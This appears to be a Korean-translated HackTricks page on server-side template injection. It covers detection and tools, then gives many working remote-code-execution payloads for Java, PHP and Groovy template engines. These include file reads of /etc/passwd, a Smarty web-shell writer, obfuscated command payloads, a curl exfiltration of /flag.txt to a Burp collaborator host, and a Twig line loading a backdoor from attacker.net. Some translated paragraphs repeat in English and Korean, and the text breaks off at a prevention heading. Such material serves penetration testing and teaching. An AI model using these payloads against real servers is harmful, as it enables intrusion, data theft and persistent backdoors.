# SSTI (서버 측 템플릿 삽입)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (3).png" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com)은 **스페인**에서 가장 관련성 높은 사이버 보안 행사이며 **유럽**에서 가장 중요한 행사 중 하나입니다. **기술적인 지식을 촉진**하기 위한 미션을 가진 이 회의는 모든 분야의 기술 및 사이버 보안 전문가들에게 열정적인 만남의 장입니다.

{% embed url="https://www.rootedcon.com/" %}

## SSTI (서버 측 템플릿 삽입)란?

서버 측 템플릿 삽입은 공격자가 서버에서 실행되는 템플릿에 악성 코드를 삽입할 수 있는 취약점입니다. 이 취약점은 Jinja를 포함한 다양한 기술에서 발견될 수 있습니다.

Jinja는 웹 애플리케이션에서 사용되는 인기있는 템플릿 엔진입니다. Jinja를 사용한 취약한 코드 스니펫을 보여주는 예제를 살펴보겠습니다:
```python
output = template.render(name=request.args.get('name'))
```
이 취약한 코드에서는 사용자의 요청에서 `name` 매개변수가 `render` 함수를 사용하여 템플릿에 직접 전달됩니다. 이로 인해 공격자는 `name` 매개변수에 악성 코드를 삽입하여 서버 측 템플릿 삽입을 유발할 수 있습니다.

예를 들어, 공격자는 다음과 같은 페이로드를 가진 요청을 조작할 수 있습니다:
```
http://vulnerable-website.com/?name={{bad-stuff-here}}
```
페이로드 `{{bad-stuff-here}}`가 `name` 매개변수에 삽입됩니다. 이 페이로드에는 공격자가 무단으로 코드를 실행하거나 템플릿 엔진을 조작하여 서버를 제어할 수 있는 Jinja 템플릿 지시문이 포함될 수 있습니다.

서버 측 템플릿 삽입 취약점을 방지하기 위해 개발자는 사용자 입력이 템플릿에 삽입되기 전에 적절하게 살균되고 유효성이 검증되도록 해야 합니다. 입력 유효성 검사를 구현하고 문맥에 따라 이스케이프 기법을 사용하면 이 취약점의 위험을 완화할 수 있습니다.

### 탐지
서버 측 템플릿 삽입 (SSTI)을 탐지하기 위해 초기에는 **템플릿 퍼징**이 직관적인 접근 방법입니다. 이는 템플릿에 특수 문자 시퀀스 (**`${{<%[%'"}}%\`**)를 삽입하고 일반 데이터와 이 특수 페이로드에 대한 서버 응답의 차이를 분석하는 것을 포함합니다. 취약점 지표는 다음과 같습니다:
- 취약점과 잠재적으로 템플릿 엔진을 드러내는 오류 발생.
- 반사에서 페이로드가 없거나 일부가 누락되어 있는 경우, 서버가 일반 데이터와 다르게 처리한다는 것을 의미.

- **일반 텍스트 문맥**: 서버가 템플릿 표현식 (예: `{{7*7}}`, `${7*7}`)을 평가하는지 XSS와 구분하여 확인.

- **코드 문맥**: 입력 매개변수를 변경하여 취약점을 확인. 예를 들어 `http://vulnerable-website.com/?greeting=data.username`의 `greeting`을 변경하여 서버의 출력이 동적인지 고정된지 확인하거나 `greeting=data.username}}hello`가 사용자 이름을 반환하는지 확인.

#### 식별 단계
템플릿 엔진을 식별하기 위해 오류 메시지를 분석하거나 다양한 언어별 페이로드를 수동으로 테스트하는 것이 필요합니다. 오류를 일으키는 일반적인 페이로드에는 `${7/0}`, `{{7/0}}`, `<%= 7/0 %>` 등이 있습니다. 수학 연산에 대한 서버의 응답을 관찰하여 특정 템플릿 엔진을 정확히 파악할 수 있습니다.

## 도구

### [TInjA](https://github.com/Hackmanit/TInjA)

새로운 폴리글롯을 활용하는 효율적인 SSTI + CSTI 스캐너입니다.
```bash
tinja url -u "http://example.com/?name=Kirlia" -H "Authentication: Bearer ey..."
tinja url -u "http://example.com/" -d "username=Kirlia"  -c "PHPSESSID=ABC123..."
```
### [SSTImap](https://github.com/vladko312/sstimap)

SSTImap은 Server-Side Template Injection (SSTI) 취약점을 탐지하기 위한 도구입니다. 이 도구는 다양한 웹 애플리케이션에서 SSTI 취약점을 찾을 수 있도록 도와줍니다. SSTI는 악의적인 사용자가 서버 측 템플릿 엔진을 이용하여 코드를 주입할 수 있는 취약점입니다. 이 취약점을 이용하면 공격자는 서버의 데이터를 노출하거나 원격 코드 실행 등의 악의적인 행위를 할 수 있습니다.

SSTImap은 다양한 템플릿 엔진 (예: Jinja2, Twig, Freemarker 등)을 지원하며, 사용자가 직접 템플릿 엔진을 추가할 수도 있습니다. 이 도구는 템플릿 엔진의 취약점을 자동으로 탐지하고, 취약한 부분을 식별하여 보고서로 제공합니다. SSTImap을 사용하여 웹 애플리케이션에서 SSTI 취약점을 신속하게 발견하고 보안을 강화할 수 있습니다.

SSTImap은 Python으로 작성되었으며, 사용하기 쉬운 명령줄 인터페이스를 제공합니다. 이 도구를 사용하여 웹 애플리케이션의 SSTI 취약점을 효과적으로 탐지하고 대응할 수 있습니다. SSTImap은 개발자 및 보안 전문가에게 유용한 도구입니다.
```bash
python3 sstimap.py -i -l 5
python3 sstimap.py -u "http://example.com/ --crawl 5 --forms
python3 sstimap.py -u 'https://example.com/page?name=John' -s
```
### [Tplmap](https://github.com/epinna/tplmap)

Tplmap은 서버 측 템플릿 인젝션(SSTI) 취약점을 자동으로 탐지하고 악용하는 도구입니다. 이 도구는 다양한 템플릿 엔진에 대한 페이로드를 제공하며, 사용자 지정 페이로드를 추가할 수도 있습니다. Tplmap은 웹 애플리케이션에서 SSTI 취약점을 찾는 데 유용한 도구입니다.
```python
python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
```
### [템플릿 주입 테이블](https://github.com/Hackmanit/template-injection-table)

가장 효율적인 템플릿 주입 폴리글롯과 44개의 주요 템플릿 엔진의 예상 응답을 포함한 대화형 테이블입니다.

## Exploits

### 일반적인

이 **워드리스트**에서는 아래 언급된 엔진들의 환경에서 정의된 **변수들**을 찾을 수 있습니다:

* [https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt)
* [https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt](https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt)

### 자바

**자바 - 기본 주입**
```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
// if ${...} doesn't work try #{...}, *{...}, @{...} or ~{...}.
```
## Java - 시스템 환경 변수 가져오기

시스템 환경 변수는 운영 체제에서 사용되는 중요한 정보를 포함하고 있을 수 있습니다. Java에서는 `System.getenv()` 메서드를 사용하여 시스템 환경 변수를 검색할 수 있습니다. 이 메서드는 `Map<String, String>` 형식의 결과를 반환합니다.

```java
Map<String, String> env = System.getenv();
for (String key : env.keySet()) {
    String value = env.get(key);
    System.out.println(key + " = " + value);
}
```

위의 코드는 시스템 환경 변수의 모든 키와 값을 출력합니다. 이를 통해 시스템 환경 변수를 검색하고 필요한 정보를 얻을 수 있습니다.
```java
${T(java.lang.System).getenv()}
```
**Java - /etc/passwd 가져오기**

Server-Side Template Injection (SSTI)는 웹 애플리케이션에서 발생할 수 있는 심각한 취약점 중 하나입니다. 이 취약점을 통해 공격자는 서버의 파일 시스템에 액세스하여 중요한 정보를 탈취할 수 있습니다. 이 문서에서는 Java 언어를 사용하여 SSTI를 통해 /etc/passwd 파일을 가져오는 방법을 설명합니다.

1. 취약한 웹 애플리케이션을 식별합니다. 일반적으로 SSTI 취약점은 템플릿 엔진을 사용하는 웹 애플리케이션에서 발견됩니다.

2. 템플릿 엔진의 취약한 부분을 찾습니다. 일반적으로 중괄호({{}}) 또는 퍼센트 기호(%%)로 둘러싸인 코드 블록이 SSTI 취약점을 나타냅니다.

3. 취약한 부분에 Java 코드를 삽입하여 /etc/passwd 파일을 읽을 수 있도록 합니다. 다음은 예시 코드입니다.

```java
${new java.io.BufferedReader(new java.io.FileReader("/etc/passwd")).lines().collect(java.util.stream.Collectors.joining("\n"))}
```

4. 코드를 실행하여 /etc/passwd 파일의 내용을 가져옵니다. 이를 통해 사용자 계정 정보와 같은 중요한 정보를 탈취할 수 있습니다.

SSTI 취약점을 이용하여 /etc/passwd 파일을 가져오는 것은 웹 애플리케이션의 보안 취약점을 확인하는 데 도움이 됩니다. 그러나 항상 법적인 허가를 받은 경우에만 테스트 및 사용해야 합니다.
```java
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
### FreeMarker (Java)

당신은 [https://try.freemarker.apache.org](https://try.freemarker.apache.org)에서 페이로드를 시도해 볼 수 있습니다.

* `{{7*7}} = {{7*7}}`
* `${7*7} = 49`
* `#{7*7} = 49 -- (레거시)`
* `${7*'7'} 아무것도 없음`
* `${foobar}`
```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}

${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```
**Freemarker - 샌드박스 우회**

⚠️ Freemarker 버전 2.3.30 미만에서만 작동합니다.
```java
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```
**추가 정보**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)의 FreeMarker 섹션에서 자세한 내용을 확인할 수 있습니다.
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker)에서도 자세한 내용을 확인할 수 있습니다.

### Velocity (Java)
```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```
**추가 정보**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)의 Velocity 섹션에서 더 많은 정보를 얻을 수 있습니다.
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity)에서도 관련 정보를 찾을 수 있습니다.

### Thymeleaf

Thymeleaf에서는 SSTI 취약점을 테스트하기 위해 일반적으로 `${7*7}`와 같은 표현식을 사용합니다. 이 템플릿 엔진에도 해당합니다. 원격 코드 실행을 위해 다음과 같은 표현식을 사용할 수 있습니다:

- SpringEL:
```java
${T(java.lang.Runtime).getRuntime().exec('calc')}
```
- OGNL:
```java
${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("calc")}
```

Thymeleaf는 이러한 표현식을 특정 속성 내에 배치해야 합니다. 그러나 _표현식 인라인_은 다른 템플릿 위치에서도 `[[...]]` 또는 `[(...)]`와 같은 구문을 사용하여 지원됩니다. 따라서 간단한 SSTI 테스트 페이로드는 `[[${7*7}]]`와 같을 수 있습니다.

그러나 이 페이로드가 작동할 가능성은 일반적으로 낮습니다. Thymeleaf의 기본 구성은 동적 템플릿 생성을 지원하지 않습니다. 템플릿은 미리 정의되어야 합니다. 개발자는 문자열에서 템플릿을 동적으로 생성하기 위해 자체 `TemplateResolver`를 구현해야 하는데, 이는 일반적으로 사용되지 않는 방법입니다.

Thymeleaf는 또한 _표현식 전처리_를 제공하는데, 이중 언더스코어(`__...__`) 내의 표현식이 전처리됩니다. 이 기능은 Thymeleaf의 문서에서 설명된 대로 표현식 구성에 활용될 수 있습니다:
```java
#{selection.__${sel.code}__}
```
**Thymeleaf에서 취약점 예시**

다음은 악용 가능성이 있는 코드 스니펫입니다.
```xml
<a th:href="@{__${path}__}" th:title="${title}">
<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'>
```
이는 템플릿 엔진이 이러한 입력을 부적절하게 처리하는 경우, 원격 코드 실행으로 이어질 수 있음을 나타냅니다. 다음과 같은 URL에 액세스할 수 있습니다:
```
http://localhost:8082/(7*7)
http://localhost:8082/(${T(java.lang.Runtime).getRuntime().exec('calc')})
```
**추가 정보**

* [https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Spring Framework (Java)
```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```
**필터 우회**

여러 변수 표현식을 사용할 수 있습니다. `${...}`이 작동하지 않으면 `#{...}`, `*{...}`, `@{...}` 또는 `~{...}`을 시도해보세요.

* `/etc/passwd` 읽기
```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
* 페이로드 생성을 위한 사용자 정의 스크립트
```python
#!/usr/bin/python3

## Written By Zeyad Abulaban (zAbuQasem)
# Usage: python3 gen.py "id"

from sys import argv

cmd = list(argv[1].strip())
print("Payload: ", cmd , end="\n\n")
converted = [ord(c) for c in cmd]
base_payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec'
end_payload = '.getInputStream())}'

count = 1
for i in converted:
if count == 1:
base_payload += f"(T(java.lang.Character).toString({i}).concat"
count += 1
elif count == len(converted):
base_payload += f"(T(java.lang.Character).toString({i})))"
else:
base_payload += f"(T(java.lang.Character).toString({i})).concat"
count += 1

print(base_payload + end_payload)
```
**추가 정보**

* [Thymleaf SSTI](https://javamana.com/2021/11/20211121071046977B.html)
* [Payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java---retrieve-etcpasswd)

### 스프링 뷰 조작 (Java)
```java
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
```
* [https://github.com/veracode-research/spring-view-manipulation](https://github.com/veracode-research/spring-view-manipulation)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Pebble (Java)

* `{{ someString.toUPPERCASE() }}`

Pebble의 이전 버전 (< 버전 3.0.9):
```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}
```
새로운 버전의 Pebble:
```java
{% raw %}
{% set cmd = 'id' %}
{% endraw %}


{% set bytes = (1).TYPE
.forName('java.lang.Runtime')
.methods[6]
.invoke(null,null)
.exec(cmd)
.inputStream
.readAllBytes() %}
{{ (1).TYPE
.forName('java.lang.String')
.constructors[0]
.newInstance(([bytes]).toArray()) }}
```
### Jinjava (자바)

Jinjava는 자바 기반의 템플릿 엔진입니다. 이 엔진은 서버 측 템플릿 주입 (Server-Side Template Injection, SSTI) 취약점을 이용하여 공격자가 악의적인 코드를 실행할 수 있는 기회를 제공합니다.

#### 취약점 식별

Jinjava를 사용하는 웹 애플리케이션에서 SSTI 취약점을 찾기 위해 다음과 같은 특징을 확인할 수 있습니다.

- 사용자 입력이 템플릿 엔진에 직접 전달되는 경우
- 사용자 입력이 템플릿 변수로 사용되는 경우
- 사용자 입력이 템플릿 필터로 사용되는 경우

#### 공격 시나리오

Jinjava를 이용한 SSTI 공격은 다음과 같은 단계로 진행됩니다.

1. 취약한 웹 애플리케이션을 식별합니다.
2. 취약점을 찾기 위해 사용자 입력을 조작합니다.
3. 악의적인 템플릿 코드를 삽입하여 실행합니다.
4. 결과를 확인하고 필요한 정보를 수집합니다.

#### 방어 대책

Jinjava를 사용하는 웹 애플리케이션에서 SSTI 취약점을 방지하기 위해 다음과 같은 대책을 적용할 수 있습니다.

- 사용자 입력을 신뢰할 수 있는 값으로 필터링하거나 이스케이프 처리합니다.
- 템플릿 엔진의 보안 설정을 강화합니다.
- 최신 버전의 Jinjava를 사용하고 취약점 패치를 적용합니다.

#### 추가 자료

- [Jinjava 공식 문서](https://jinjava.github.io/jinjava/)
```java
{{'a'.toUpperCase()}} would result in 'A'
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
```
Jinjava는 Hubspot에서 개발한 오픈 소스 프로젝트로, [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)에서 사용할 수 있습니다.

**Jinjava - 명령 실행**

[https://github.com/HubSpot/jinjava/pull/230](https://github.com/HubSpot/jinjava/pull/230)에서 수정되었습니다.
```java
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```
**추가 정보**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava)

### Hubspot - HuBL (Java)

* `{% %}` 문 구분자
* `{{ }}` 표현식 구분자
* `{# #}` 주석 구분자
* `{{ request }}` - com.hubspot.content.hubl.context.TemplateContextRequest@23548206
* `{{'a'.toUpperCase()}}` - "A"
* `{{'a'.concat('b')}}` - "ab"
* `{{'a'.getClass()}}` - java.lang.String
* `{{request.getClass()}}` - class com.hubspot.content.hubl.context.TemplateContextRequest
* `{{request.getClass().getDeclaredMethods()[0]}}` - public boolean com.hubspot.content.hubl.context.TemplateContextRequest.isDebug()

"com.hubspot.content.hubl.context.TemplateContextRequest"를 검색하여 [Github의 Jinjava 프로젝트](https://github.com/HubSpot/jinjava/)를 발견했습니다.
```java
{{request.isDebug()}}
//output: False

//Using string 'a' to get an instance of class sun.misc.Launcher
{{'a'.getClass().forName('sun.misc.Launcher').newInstance()}}
//output: sun.misc.Launcher@715537d4

//It is also possible to get a new object of the Jinjava class
{{'a'.getClass().forName('com.hubspot.jinjava.JinjavaConfig').newInstance()}}
//output: com.hubspot.jinjava.JinjavaConfig@78a56797

//It was also possible to call methods on the created object by combining the



{% raw %}
{% %} and {{ }} blocks
{% set ji='a'.getClass().forName('com.hubspot.jinjava.Jinjava').newInstance().newInterpreter() %}
{% endraw %}


{{ji.render('{{1*2}}')}}
//Here, I created a variable 'ji' with new instance of com.hubspot.jinjava.Jinjava class and obtained reference to the newInterpreter method. In the next block, I called the render method on 'ji' with expression {{1*2}}.

//{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
//output: xxx

//RCE
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
//output: java.lang.UNIXProcess@1e5f456e

//RCE with org.apache.commons.io.IOUtils.
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//output: netstat execution

//Multiple arguments to the commands
Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//Output: Linux bumpy-puma 4.9.62-hs4.el6.x86_64 #1 SMP Fri Jun 1 03:00:47 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```
**추가 정보**

* [https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)

### 표현 언어 - EL (Java)

* `${"aaaa"}` - "aaaa"
* `${99999+1}` - 100000.
* `#{7*7}` - 49
* `${{7*7}}` - 49
* `${{request}}, ${{session}}, {{faceContext}}`

표현 언어 (EL)은 JavaEE에서 프레젠테이션 레이어(웹 페이지와 같은)와 애플리케이션 로직(관리되는 빈과 같은) 간의 상호 작용을 용이하게 하는 기본 기능입니다. 이는 여러 JavaEE 기술에서 널리 사용되어 이러한 통신을 간소화합니다. EL을 사용하는 주요 JavaEE 기술은 다음과 같습니다.

- **JavaServer Faces (JSF)**: EL을 사용하여 JSF 페이지의 구성 요소를 해당하는 백엔드 데이터와 작업에 바인딩합니다.
- **JavaServer Pages (JSP)**: JSP에서 데이터에 액세스하고 조작하기 위해 EL을 사용하여 페이지 요소를 애플리케이션 데이터에 연결하는 데 사용됩니다.
- **Contexts and Dependency Injection for Java EE (CDI)**: EL은 CDI와 통합되어 웹 레이어와 관리되는 빈 간의 원활한 상호 작용을 가능하게 하여 더 일관된 애플리케이션 구조를 보장합니다.

**EL 해석기의 악용**에 대해 자세히 알아보려면 다음 페이지를 확인하세요:

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Groovy (Java)

다음 보안 관리자 우회 방법은 이 [**기사**](https://security.humanativaspa.it/groovy-template-engine-exploitation-notes-from-a-real-case-scenario/)에서 가져왔습니다.
```java
//Basic Payload
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "ping cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net "
assert java.lang.Runtime.getRuntime().exec(cmd.split(" "))
})
def x

//Payload to get output
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "whoami";
out = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmd.split(" ")).getInputStream()).useDelimiter("\\A").next()
cmd2 = "ping " + out.replaceAll("[^a-zA-Z0-9]","") + ".cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net";
java.lang.Runtime.getRuntime().exec(cmd2.split(" "))
})
def x

//Other payloads
new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x")
this.evaluate(new String(java.util.Base64.getDecoder().decode("QGdyb292eS50cmFuc2Zvcm0uQVNUVGVzdCh2YWx1ZT17YXNzZXJ0IGphdmEubGFuZy5SdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJpZCIpfSlkZWYgeA==")))
this.evaluate(new String(new byte[]{64, 103, 114, 111, 111, 118, 121, 46, 116, 114, 97, 110, 115, 102, 111, 114, 109, 46, 65, 83, 84, 84, 101, 115, 116, 40, 118, 97, 108, 117, 101, 61, 123, 97, 115, 115, 101, 114, 116, 32, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101, 46, 103, 101, 116, 82,117, 110, 116, 105, 109, 101, 40, 41, 46, 101, 120, 101, 99, 40, 34, 105, 100, 34, 41, 125, 41, 100, 101, 102, 32, 120}))
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/)은 **스페인**에서 가장 관련성 있는 사이버 보안 행사이며 **유럽**에서 가장 중요한 행사 중 하나입니다. **기술적인 지식을 촉진하는 미션**을 가지고 있는 이 회의는 모든 분야의 기술 및 사이버 보안 전문가들에게 열정적인 만남의 장입니다.

{% embed url="https://www.rootedcon.com/" %}

##


### Smarty (PHP)
```php
{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // compatible v3
{system('cat index.php')} // compatible v3
```
**추가 정보**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)의 Smarty 섹션에서 더 많은 정보를 확인할 수 있습니다.
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty)에서도 확인할 수 있습니다.

### Twig (PHP)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{7*'7'}} = 49`
* `{{1/0}} = Error`
* `{{foobar}} Nothing`
```python
#Get Info
{{_self}} #(Ref. to current application)
{{_self.env}}
{{dump(app)}}
{{app.request.server.all|join(',')}}

#File read
"{{'/etc/passwd'|file_excerpt(1,30)}}"@

#Exec code
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{['id',""]|sort('system')}}

#Hide warnings and errors for automatic exploitation
{{["error_reporting", "0"]|sort("ini_set")}}
```
**Twig - 템플릿 형식**

Twig is a popular template engine for PHP. It provides a secure and flexible way to render templates. Twig templates are written in a syntax that is easy to read and write.

Twig은 PHP용 인기있는 템플릿 엔진입니다. 템플릿을 렌더링하는 안전하고 유연한 방법을 제공합니다. Twig 템플릿은 읽고 쓰기 쉬운 구문으로 작성됩니다.

**Server-Side Template Injection (SSTI)**

Server-Side Template Injection (SSTI) is a vulnerability that allows an attacker to inject malicious code into a server-side template. This can lead to remote code execution and other security risks.

서버 측 템플릿 삽입(SSTI)은 공격자가 서버 측 템플릿에 악성 코드를 삽입할 수 있는 취약점입니다. 이로 인해 원격 코드 실행 및 기타 보안 위험이 발생할 수 있습니다.

**Exploiting SSTI in Twig**

To exploit SSTI in Twig, an attacker needs to identify the injection point and craft a payload that will be executed by the template engine. The payload can include Twig template code and can be used to execute arbitrary commands or access sensitive information.

Twig에서 SSTI를 악용하기 위해서는 공격자가 삽입 지점을 식별하고 템플릿 엔진에서 실행될 페이로드를 작성해야 합니다. 페이로드에는 Twig 템플릿 코드가 포함될 수 있으며, 임의의 명령을 실행하거나 민감한 정보에 액세스하는 데 사용될 수 있습니다.

**Preventing SSTI in Twig**

